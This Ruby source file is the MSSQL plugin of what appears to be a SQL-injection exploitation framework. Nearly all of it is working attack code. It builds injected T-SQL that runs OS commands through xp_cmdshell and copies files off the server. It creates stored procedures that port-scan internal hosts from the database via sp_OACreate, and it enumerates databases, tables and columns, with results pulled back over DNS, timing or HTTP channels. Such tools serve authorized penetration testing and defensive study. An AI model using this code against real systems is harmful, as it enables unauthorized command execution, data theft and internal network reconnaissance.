require 'squeezahttp'
require 'sqlreturnchannelviadns'
require 'sqlreturnchannelviatime'
require 'sqlreturnchannelviahttp'

class MSSqlDns < SqueezaPlugin
	#@http_req = nil
	@@cmdholder = "DNS_DNS_DNS"
	
	def MSSqlDns.help
		puts "mssql module commands and variables"
		puts " commands:"
		puts "  !channel : shows current return channel"
		puts "  !channel <name> : switches return channel to <name>"
		puts "  !cmd    : switches to command execution mode"
		puts "  !copy   : switches to file copy mode"
		puts "  !sql    : switches to sql extraction mode"
		puts "   !ret <option>  : executes pre-set database queries, where option is one of: info databases tables. Only valid with !sql"
		puts " variables:"
		puts "  cmd_table_name    : temporary table name for command execution"
		puts "  cp_table_name     : temporary table name for file copy"
		puts "  lines_per_request : number of lines to attempt to fetch per http request (if channel support is available. only dns support so far)"
		puts "  mssql_channel     : current return channel type"
		puts "  mssql_mode        : current exploitation mode"
		puts "  sql_prefix        : sql injection string prefix"
		puts "  sql_postfix       : sql injection string postfix"
	end
	
	def help
		MSSqlDns.help
		@channel.help if !@channel.nil?
		HTTPRequestor.help
	end

	def initialize(config)
		@config = config

		
		if (@config.getv("cmd_table_name").nil?)
			@cmd_table_name = "sqcmd"
		else
			@cmd_table_name = @config.getv("cmd_table_name")
		end
		if (@config.getv("cp_table_name").nil?)
			@cp_table_name = "sqfilecp"
		else
			@cp_table_name = @config.getv("cp_table_name")
		end
		
		if (@config.getv("mssql_mode").nil?)
			@config.setv("mssql_mode","cmd") 
		end

		@sql_clear = "delete from #{@cmd_table_name};"
		@sql_cleanup = "drop table #{@cmd_table_name};"

		if @config.getv("sql_prefix").nil?
			@config.setv("sql_prefix","")
		end
		
		if @config.getv("sql_postfix").nil?
			@config.setv("sql_postfix","")
		end

		if @config.getv("mssql_channel").nil?
			@config.setv("mssql_channel","dns")
		end

		@http = HTTPRequestor.new(@config.getv("host"), @config.getv("port"), @config.getv("method"), @config.getv("url"), @config.getv("querystring"), @config.getv("headers"), (@config.getv("ssl")=="on"? true : false), @config.getv("http_resp_ok"))

		@config.set_command("cmd")  { 
			@config.setv("mssql_mode","cmd")  
			if @config.getv("dns_privs") != "high" && @config.getv("dns_privs") != "medium" || @config.getv("time_privs") != "high"
				Debug.print("Switching to xp_cmdshell extracting injection string and time-based data extractiong string",1)
				@config.setv("dns_privs","high")
				@config.setv("time_privs","high")
			end
		}
		@config.set_command("copy") { 
			@config.setv("mssql_mode","copy") 
			if @config.getv("dns_privs") != "high" && @config.getv("dns_privs") != "medium" || @config.getv("time_privs") != "high"
				Debug.print("Switching to xp_cmdshell extracting injection string and time-based data extractiong string",1)
				@config.setv("dns_privs","high")
				@config.setv("time_privs","high")
			end
		}
		@config.set_command("sql")  { 
			if @config.getv("mssql_channel") == "http"
				Debug.error("HTTP channel does not support !sql mode")
			else
				@config.setv("mssql_mode","sql") 
				@config.set_command("ret") {|option|
					sql_enumerate(option)
				} if @config.get_command("ret").nil?
				if @config.getv("dns_privs") != "low" || @config.getv("time_prive") != "low"
					Debug.print("Switching to SQL extracting injection string",1)
					@config.setv("dns_privs","low")
					@config.setv("time_privs","low")
				end
			end

		}
		@config.set_command("portscan")  { 
			@config.setv("mssql_mode","portscan")  
			if @config.getv("dns_privs") != "high" && @config.getv("dns_privs") != "medium" || @config.getv("time_privs") != "high"
				Debug.print("Switching to xp_cmdshell extracting injection string and time-based data extractiong string",1)
				@config.setv("dns_privs","high")
				@config.setv("time_privs","high")
			end
		}

		initial_mode = @config.getv("mssql_mode")
		@config.get_command(initial_mode ? initial_mode: "cmd").call()

		@channel = nil
		@config.set_command("channel") {|channel| 
			case channel
			when "time"
				@config.setv("mssql_channel",channel) 
				@channel = SQLReturnChannelViaTime.new(@http, @config) if !@channel.is_a?SQLReturnChannelViaTime
				case @config.getv("mssql_mode")
					when "cmd"
						Debug.error("cmd mode is incompatible with low_priv timing... switching to high_priv") 
						@config.setv("time_privs","high")
					when "copy"
						Debug.error("copy mode is incompatible with low_priv timing... switching to high_priv") 
						@config.setv("time_privs","high")
				end if @config.getv("time_privs") == "low"
			when "dns"
				@channel = SQLReturnChannelViaDNS.new(@http, @config) if !@channel.is_a?SQLReturnChannelViaDNS
				@config.setv("mssql_channel",channel) 
			when "http"
				@channel = SQLReturnChannelViaHTTP.new(@http, @config) if !@channel.is_a?SQLReturnChannelViaHTTP
				@config.setv("mssql_channel",channel)
			when nil
				puts @config.getv("mssql_channel")
			else
				Debug.error("Unknown channel, possible options are: dns time http")
			end
		}

		initial_channel = @config.getv("mssql_channel")
		@config.get_command("channel").call(initial_channel)
		
		#x= @http_req.send("wqeqweqwe")
		#puts x.body
	end

	def get_cmd(command, &output_block)
		
		@sql_cmd = "drop table #{@cmd_table_name};create table #{@cmd_table_name}(data text, num int identity(1,1));INSERT into #{@cmd_table_name} EXEC master..xp_cmdshell '#{@@cmdholder}'; insert into #{@cmd_table_name} values ('ENDOFSQL');update #{@cmd_table_name} set data='BLANKLINE' where data is null;"

		Debug.print("Sending command",2)
		begin

			command = @config.getv("sql_prefix") + @sql_cmd.sub(/#{@@cmdholder}/,command) + @config.getv("sql_postfix")
			Debug.print("Request is: #{command}",2)

			@http.send(command)

			@channel.start({"table" => @cmd_table_name, "lines_per_request" => @config.getv("lines_per_request"), "mode" => "fast"})

			@channel.eachline{|linenum,line|
				if block_given?
					output_block.call(linenum,line)
				else
					puts line
				end
				Debug.print("Got line #{linenum}, length #{line.length}}",2)
			}


			rescue HTTPException => err
				Debug.error "#{err.to_s}"
		end
		Debug.print("Command sent",2)
	end

	def get_portscan(command, &output_block)
		@sql_create_probeip = "exec('drop procedure probeip');exec('CREATE PROCEDURE probeip @host VARCHAR(50), @port VARCHAR(5) AS BEGIN DECLARE @o INT,@rop INT,@rse INT,@status INT,@s varchar(60); set @s=''http://''+@host+'':''+@port+''/''; EXEC sp_OACreate ''MSXML2.ServerXMLHTTP'', @o OUT; EXEC @rop = sp_OAMethod @o, ''setTimeouts'', NULL, 3000, 3000, 3000, 3000; EXEC @rop = sp_OAMethod @o, ''open'', NULL, ''GET'',@s; EXEC @rse = sp_OAMethod @o, ''send''; EXEC sp_OAGetProperty @o, ''status'', @status OUT; EXEC sp_OADestroy @o; SELECT @s=@s+CASE @rop WHEN -2147012891 THEN ''Blocked'' WHEN 0 THEN CASE @rse WHEN -2147012744 THEN ''Open'' WHEN 0 THEN ''Open/WWW'' WHEN -2147012867 THEN ''Closed'' WHEN -2147012894 THEN ''Filtered'' WHEN -2147012851 THEN ''Open/WWWR'' ELSE ''Invalid'' END END; insert into #{@cmd_table_name} values(@s); END;')"
		@sql_create_scanhosts = "exec('drop procedure scanhosts');exec('create procedure scanhosts @hosts varchar(8000),@port varchar(5) as begin declare @tmp varchar(100),@i int,@output varchar(500); set @i=charindex('','',@hosts); drop table #{@cmd_table_name};create table #{@cmd_table_name}(data text, num int identity(1,1)); while @i > 0 and charindex('','',@hosts)>0 begin set @tmp=substring(@hosts,0,@i); set @hosts=substring(@hosts,@i+1,len(@hosts)); exec probeip @tmp, @port; set @i=charindex('','', @hosts); end; exec probeip @hosts, @port; insert into #{@cmd_table_name} values(''ENDOFSQL''); end;');"
		@sql_create_scanports = "exec('drop procedure scanports');exec('create procedure scanports @host varchar(50),@ports varchar(8000) as begin declare @tmp varchar(50),@i int;set @i=charindex('','',@ports);drop table #{@cmd_table_name};create table #{@cmd_table_name}(data text, num int identity(1,1));while @i > 0 and charindex('','',@ports)>0 begin set @tmp=substring(@ports,0,@i);set @ports=substring(@ports,@i+1,len(@ports));exec probeip @host,@tmp;set @i=charindex('','', @ports);end;exec probeip @host,@ports;insert into #{@cmd_table_name} values(''ENDOFSQL'');end;')"
		@sql_exec_scanhosts = "exec scanhosts 'HOST', 'PORT'"
		@sql_exec_scanports = "exec scanports 'HOST', 'PORT'"
		
		Debug.print("Sending command",2)
		begin

			(ip,port) = command.split(/:/)

			Debug.print("Creating probeip()")
			command = @config.getv("sql_prefix") + @sql_create_probeip + @config.getv("sql_postfix")
			Debug.print("Request is: #{command}",2)
			@http.send(command)

			Debug.print("Creating scanhosts()")
			command = @config.getv("sql_prefix") + @sql_create_scanhosts + @config.getv("sql_postfix")
			Debug.print("Request is: #{command}",2)
			@http.send(command)

			Debug.print("Creating scanports()")
			command = @config.getv("sql_prefix") + @sql_create_scanports + @config.getv("sql_postfix")
			Debug.print("Request is: #{command}",2)
			@http.send(command)

			if ip =~ /,/
				if port =~ /,/
					Debug.error("Either provide a list of ips, or a list of ports, but no both")
					return
				end
				Debug.print("Starting portscan using scanhosts()")
				command = @config.getv("sql_prefix") + @sql_exec_scanhosts.sub(/HOST/,ip).sub(/PORT/,port) + @config.getv("sql_postfix")
				Debug.print("Request is: #{command}",2)
				@http.send(command)
			else
				Debug.print("Starting portscan using scanports()")
				command = @config.getv("sql_prefix") + @sql_exec_scanports.sub(/HOST/,ip).sub(/PORT/,port) + @config.getv("sql_postfix")
				Debug.print("Request is: #{command}",2)
				@http.send(command)
			end

			@channel.start({"table" => @cmd_table_name, "lines_per_request" => @config.getv("lines_per_request"), "mode" => "fast"})

			@channel.eachline{|linenum,line|
				if block_given?
					output_block.call(linenum,line)
				else
					puts line
				end
				Debug.print("Got line #{linenum}, length #{line.length}}",2)
			}


			rescue HTTPException => err
				Debug.error "#{err.to_s}"
		end
		Debug.print("Command sent",2)

	end
	def get_file(cmd)

		(src,dst) = cmd.split(/ +/)
		
		if dst.nil?
			dst = src.split(/.*\\/)[1]
		end

		Debug.print("Copying remote #{src} to local #{dst}",1)

		@sql_file_copy = "drop table #{@cp_table_name};create table #{@cp_table_name} (data text);exec master..xp_cmdshell 'copy /Y #{@@cmdholder} c:\\temp\\sqtmp.bin && echo 1 >> c:\\temp\\sqtmp.bin'; bulk insert #{@cp_table_name} from 'c:\\temp\\sqtmp.bin' with (codepage='RAW',rowterminator='\\n');alter table #{@cp_table_name} ADD num int identity(1,1);insert into #{@cp_table_name} values ('ENDOFSQL');"
		Debug.print("Sending file request",2)
		begin
			@channel.start({"table" => @cp_table_name, "lines_per_request" => @config.getv("lines_per_request"), "mode" => "safe"})

			command = @config.getv("sql_prefix") + @sql_file_copy.sub(/#{@@cmdholder}/,src) + @config.getv("sql_postfix")
			Debug.print("Request is: #{command}",2)
			@http.send(command)

			f = File.open(dst,"w")
			line_num=0
			possible_eof = false
			@channel.eachline {|linenum,line| 
				Debug.print("Got line #{linenum}, length #{line.length}}",1)

				if line[line.length-1] == 32 && line[line.length-2] == 49
					#Hardcoded eof marker, a "1 \r\n" in the orignal file got converted to "1 " in the DB
					#Because we don't yet know if this is the last line (in which case we drop the "1"),
					#raise and flag and write eveything upto the last char
					possible_eof = true
					line.slice!(line.length-2..line.length-1)
				elsif possible_eof
						#got another line, clearly not yet eof, write the marker
						f.write "1 \r\n"
				end
				f.write line 
				f.write "\r\n" if line_num!=linenum && !possible_eof
				possible_eof = false
				line_num=linenum
				f.flush
			}
			f.close
			rescue HTTPException => err
				Debug.error "#{err.to_s}"
		end
		Debug.print("File retreival ended",2)
	end

	def sql_enumerate(option)
		return if @config.getv("mssql_mode") != "sql"
		block = Proc.new {|linenum,line| puts line}
		case option
		when "info"
			sql_command = "@@version+'|'+USER_NAME()+'|'+SYSTEM_USER+'|'+HOST_NAME() sysobjects name='sysobjects'"
			block = Proc.new {|linenum,line| (version,username,sysuser,hostname) = line.split(/\|/); puts "Version\n=======\n#{version}\n\nUsername\n========\n#{username}\n\nSysuser\n=======\n#{sysuser}\n\nHostname\n========\n#{hostname}" }
		when "databases"
			sql_command = "name master..sysdatabases"
		when "tables"
			sql_command = "name sysobjects xtype='U'"
		when /columns (.+)$/
			sql_command = "syscolumns.name syscolumns,sysobjects sysobjects.name='#{$1}' and sysobjects.id=syscolumns.id"
		end

		get_sql(sql_command,&block)
	end

	def get_sql(command, &block)

		(column,table,whereclause) = command.split(/ /,3)
		if column.nil? || table.nil?
			Debug.error("Invalid SQL line. Format is: columnname tablename where-clause")
			Debug.error("e.g		name sysobjects xtype='U'")
			return
		end

		whereclause = " where #{whereclause}" if !whereclause.nil?
	
		@channel.start({"lines_per_request" => @config.getv("lines_per_request"), "column_name"=>column, "table_name" => table, "where_clause" => whereclause})
		
		@channel.eachline{|linenum,line|
			if block_given?
				block.call(linenum,line)
			else
				puts line
			end
		}
	end

  def get_formatted_sql(command, &block)

		@channel.start({"lines_per_request" => @config.getv("lines_per_request"), 
				"column_name"=> command['column'], 
				"table_name" => command['table'], 
				"where_clause" => " where #{command['where_clause']}",
				"order_by" => (command['order_by'].nil? ? "" : " order by #{command['order_by']}")})
		Debug.print("starting channel")

		if command['oneline'] == "true"
			Debug.print("Only getting one line")
			@channel.oneline {|linenum,line|
				Debug.print("looped eachline")
				if block_given?
					Debug.print("in block call")
					block.call(linenum,line)
				else
					puts line
				end
			}
		else
			@channel.eachline{|linenum,line|
				Debug.print("looped eachline")
				if block_given?
					Debug.print("in block call")
					block.call(linenum,line)
				else
					puts line
				end
			}
		end
	end
	
	def passthru_sql(command)
		@channel.tcpdump_prepare
		@channel.passthru_sql(command['statement'])
	end

	def send_formatted_cmd(command, &output_block)
		case @config.getv("mssql_mode")
		when "sql"
			if command['passthru'] == "true"
				passthru_sql(command)
			else
				get_formatted_sql(command, &output_block)
			end
		else
			puts "Not supported without SQL mode"
		end
	end

	def send_cmd(command, &output_block)
		Debug.print("Sending command",2)

		output_block = Proc.new {|linenum,line| puts line} if !block_given?

		case @config.getv("mssql_mode")
			when "cmd"
				get_cmd(command, &output_block)
			when "copy"
				get_file(command, &output_block)
			when "sql"
				get_sql(command, &output_block)
			when "portscan"
				get_portscan(command, &output_block)
			else
				Debug.error("Unknown mssql mode #{@config.getv("mssql_mode")}")
		end
	end
end
